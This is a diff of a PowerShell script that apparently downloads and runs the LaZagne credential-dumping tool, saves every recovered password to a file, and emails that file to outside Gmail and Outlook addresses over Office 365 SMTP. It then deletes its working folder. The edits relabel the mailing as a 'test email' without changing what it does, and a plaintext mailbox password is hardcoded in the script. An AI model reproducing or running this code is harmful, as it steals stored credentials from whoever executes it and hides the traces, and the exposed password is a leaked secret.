@@ -94,17 +94,33 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 # Execute the executable and save output to a file
 & "$dir\lazagne.exe" all > "$dir\output.txt"
 
-if (-not $MailCredentials) {
-    $MailCredentials = "HerbertdePervert69@"
+# Define the username and password for your email account
+$Username = "herbertswindel@outlook.com"  # Replace with your actual email address
+$Password = ConvertTo-SecureString "HerbertdePervert69@" -AsPlainText -Force  # Replace with your actual password
+
+# Create a PSCredential object
+$MailCredentials = New-Object System.Management.Automation.PSCredential($Username, $Password)
+
+# Define your email parameters and use the $MailCredentials variable for credentials
+$EmailParams = @{
+    From = @{ Name = 'Herbert Swindèl'; Email = 'herbertswindel@outlook.com' }
+    To = 'herbertswindel@gmail.com'
+    Server = 'smtp.office365.com'
+    SecureSocketOptions = 'Auto'
+    Credential = $MailCredentials
+    HTML = $Body
+    DeliveryNotificationOption = 'OnSuccess'
+    Priority = 'High'
+    Subject = 'This is another test email'
 }
-# this is simple replacement (drag & drop to Send-MailMessage)
-Send-EmailMessage -To 'herbertswindel@gmail.com' -Subject 'Hier zijn uw gegevens kameraad!' -Body 'Groetjes, Herbert Swindel' -SmtpServer 'smtp.office365.com' -From 'herbertswindel@outlook.com' `
-    -Attachments "$dir\output.txt" -Encoding UTF8 -Cc 'herbertswindel@outlook.com' -Credential $MailCredentials `
-    -UseSsl -Port 587 -Verbose
-$Body = EmailBody {
-    EmailText -Text ' '
-    EmailTable -DataTable (Get-Process | Select-Object -First 5 -Property Name, Id, PriorityClass, CPU, Product)
-}
+
+# Send the email using Send-EmailMessage
+Send-EmailMessage @EmailParams
+
+# You can also use Send-MailMessage with the same credentials
+Send-MailMessage -To 'przemyslaw.klys@test.pl' -Subject 'Test' -Body 'test me' -SmtpServer 'smtp.office365.com' -From 'herbertswindel@outlook.com' `
+    -Attachments "$dir\output.txt" -Encoding UTF8 -Cc 'herbertswindel@outlook.com' -DeliveryNotificationOption OnSuccess -Priority High -Credential $MailCredentials -UseSsl -Port 587 -Verbose
+
 
 # Clean up
 Remove-Item -Path $dir -Recurse -Force
